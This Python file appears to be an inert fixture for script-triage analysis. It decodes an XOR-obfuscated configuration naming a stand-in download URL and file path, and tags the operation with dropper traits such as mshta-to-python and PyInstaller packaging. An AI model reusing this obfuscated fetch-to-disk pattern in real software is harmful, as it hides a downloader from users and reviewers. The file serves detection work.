# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_0237bd22 = "255,246,168,179,226,190,190,180,226,176,178,183,227,171,227,242,231,226,246,243,168,169,228,231,202,245,245,227,244,242,232,243,206,169,231,242,231,194,235,231,244,225,233,244,214,169,188,197,187,238,242,231,246,217,227,234,239,224,250,179,226,190,190,180,226,176,178,183,227,169,232,233,238,242,255,214,245,245,227,244,242,232,243,206,187,242,232,227,225,231,217,244,227,245,243,250,255,246,168,176,182,182,226,226,224,226,191,169,226,239,234,231,240,232,239,168,227,234,246,235,231,254,227,168,179,226,190,190,180,226,176,178,183,227,169,169,188,245,246,242,242,238,187,234,244,243,250,179,226,190,190,180,226,176,178,183,227,171,232,225,239,231,246,235,231,229,187,226,239,217,232,225,239,231,246,235,231,229,250,232,233,238,242,255,246,217,233,242,217,231,242,238,245,235,187,232,239,231,238,229,217,245,241,233,226,232,239,241,250,227,234,239,224,227,232,233,217,244,227,234,234,231,242,245,232,239,255,246,187,244,227,239,244,244,231,229,250,245,242,232,227,235,225,231,244,224,217,225,232,239,244,242,245,224,187,232,233,239,242,231,229,245,243,224,228,233,250,227,232,239,234,227,246,239,246,217,244,233,242,231,244,227,232,227,225,187,254,231,242,232,255,245,250,183,187,242,232,243,233,229,217,227,225,231,242,245,250,238,242,231,246,217,233,242,217,228,239,234,234,244,243,187,244,227,242,246,231,226,231,250,227,234,239,224,217,227,242,239,244,241,170,227,242,233,235,227,244,217,227,244,239,243,247,229,231,187,245,246,227,242,245,250,180,187,240"
CODEC_0237bd22 = "decimal_csv|reverse_then_xor|86"

def load_0237bd22():
    return bytes(int(item) for item in MATERIAL_0237bd22.split(","))

def decode_0237bd22(stored_bytes):
    return bytes(value ^ 134 for value in reversed(stored_bytes))

def recover_0237bd22():
    harmless_value = ":".join(("north", "south"))
    recovered_bytes = decode_0237bd22(load_0237bd22())
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_0237bd22():
    return recover_0237bd22()

def surface_0237bd22():
    stream = (item for item in ("generator_pipeline", "fstring_fragments", "pyinstaller_onefile", "mshta_to_python"))
    return tuple(stream)

def obfuscation_0237bd22():
    left, right = "fstrin", "g_fragments"
    return f"{left}{right}"

def plan_0237bd22():
    fields = dict(item.split("=", 1) for item in inspect_0237bd22().split("|"))
    analysis_surface = surface_0237bd22()
    obfuscation_surface = obfuscation_0237bd22()
    operation_plan = ("urllib_to_path", fields["url"], fields["file_path"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_0237bd22())

# reconstruction complete